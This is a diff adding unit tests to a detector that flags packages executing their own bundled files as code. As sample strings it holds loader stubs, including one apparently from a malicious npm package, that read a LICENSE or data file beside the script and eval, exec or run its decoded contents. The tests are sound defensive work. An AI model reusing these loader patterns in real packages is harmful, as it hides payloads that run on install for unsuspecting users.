@@ -238,6 +238,63 @@ class SelfReadTests(unittest.TestCase):
             with self.subTest(text[:30]):
                 self.assertGreaterEqual(core.runs_own_source_at(text), 0)
 
+    def test_a_licence_read_asynchronously_by_its_paths_name(self):
+        """react-thunk-log 2.23.2 (0.1.8): its install hook started a script
+        that read the LICENSE next to it with a callback and ran it decrypted."""
+        thunk = ("const fs = require('fs');\nconst path = require('path');\nconst parseLib = require('./parse')\n\n"
+                 "const filePath = path.join(__dirname, 'LICENSE');\n\n"
+                 "fs.readFile(filePath, 'utf8', (_, data) => {\n  try {\n    // Only eval if you're sure it's valid JS\n"
+                 "    eval(parseLib(data))\n  } catch (err) {\n    console.error('Error during parsing/eval:', err);\n"
+                 "  }\n});\n")
+        self.assertEqual(core.install_script_risk(thunk), [self.OWN])
+        self.assertEqual(core.import_time_risk(thunk, "js"), ([self.OWN], 10))
+        for text in (
+                "fs.readFile(path.join(__dirname, 'payload.dat'), (err, buf) => { eval(decrypt(buf)); });",
+                "fs.readFile(p, 'utf8', function (err, code) { new Function(code)(); });\n"
+                "const p = path.resolve(__dirname, 'LICENSE');",
+                "const p = path.join(__dirname, 'data.bin');\nfs.promises.readFile(p).then((b) => eval(b.toString()));",
+                "const p = `${__dirname}/README`;\nconst src = await fsp.readFile(p, 'utf8');\n"
+                "vm.runInThisContext(xor(src));",
+                "const p = path.join(__dirname, 'x.txt');\nconst c = fs.readFileSync(p, 'utf8');\neval(c);",
+                "import os\np = os.path.join(os.path.dirname(__file__), 'LICENSE')\nwith open(p) as f:\n"
+                "    exec(f.read())\n",
+                "with open(os.path.join(os.path.dirname(__file__), 'data.bin'), 'rb') as f:\n"
+                "    exec(zlib.decompress(f.read()))\n",
+                "p = Path(__file__).parent / 'NOTICE'\nexec(base64.b64decode(p.read_text()))\n",
+                "require('fs').readFile(__filename, 'utf8', (e, s) => eval(s.split('//@')[1]));",
+                "fsp.readFile(path.join(__dirname, 'LICENSE.txt'), 'utf8').then(function (t) { eval(t) })"):
+            with self.subTest(text[:40]):
+                self.assertGreaterEqual(core.runs_own_source_at(text), 0)
+
+    def test_what_a_path_read_by_name_gives_counts_only_in_code_runners(self):
+        """A CLI reads its package.json by a path's name and puts the version
+        in a git command; the same value handed to eval counts."""
+        pkg = ("const pkgPath = path.join(__dirname, 'package.json');\n"
+               "const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));\nexecSync('git tag v' + pkg.version);\n")
+        self.assertEqual(core.runs_own_source_at(pkg), -1)
+        self.assertGreaterEqual(core.runs_own_source_at(pkg.replace("execSync(", "eval(")), 0)
+        for text in (
+                "fs.readFile(pkgPath, 'utf8', (err, txt) => { execSync('npm view ' + JSON.parse(txt).name) });\n"
+                "const pkgPath = path.join(__dirname, 'package.json');",
+                "const p = path.join(__dirname, 'config.json');\nfs.readFile(p, (e, d) => { console.log(JSON.parse(d)) });\n"
+                "eval(x)",
+                "const p = path.join(__dirname, 'LICENSE');\nfs.readFile(p, 'utf8', (e, t) => console.log(t));\n",
+                "const tpl = \"fs.readFile(path.join(__dirname, 'LICENSE'), (e, d) => eval(d))\";\n",   # a string
+                "fs.readFile(userFile, (e, d) => eval(d));",                                  # not a file of the package
+                "const p = path.join(__dirname, 'lib.js');\nfs.readFile(p, (e, d) => eval(d));",   # code, not data
+                "with open(sys.argv[1]) as f:\n    exec(f.read())\n"):
+            with self.subTest(text[:40]):
+                self.assertEqual(core.runs_own_source_at(text), -1)
+
+    def test_hostile_texts_finish_fast(self):
+        for text in ("p = __dirname + '" + "a/" * 100_000 + "\n" + "fs.readFile(p, (e, d) => eval(d));\n" * 2_000,
+                     "fs.readFile(p, " * 100_000, "(e, d) => " * 100_000 + "fs.readFile(__filename",
+                     "p = path.join(__dirname, 'LICENSE')\n" * 20_000 + "fs.readFile(p).then(" * 20_000,
+                     "`${__dirname}/" * 100_000, "x.read_text(" * 100_000 + "p = __dirname + 'LICENSE'\n"):
+            t0 = time.monotonic()
+            core.runs_own_source_at(text)
+            self.assertLess(time.monotonic() - t0, 10, text[:30])
+
     def test_what_is_not(self):
         for text in ("import os\nhere = os.path.dirname(__file__)\n"
                      "exec(open(os.path.join(here, 'pkg', 'version.py')).read())\n",     # setup.py reads a version
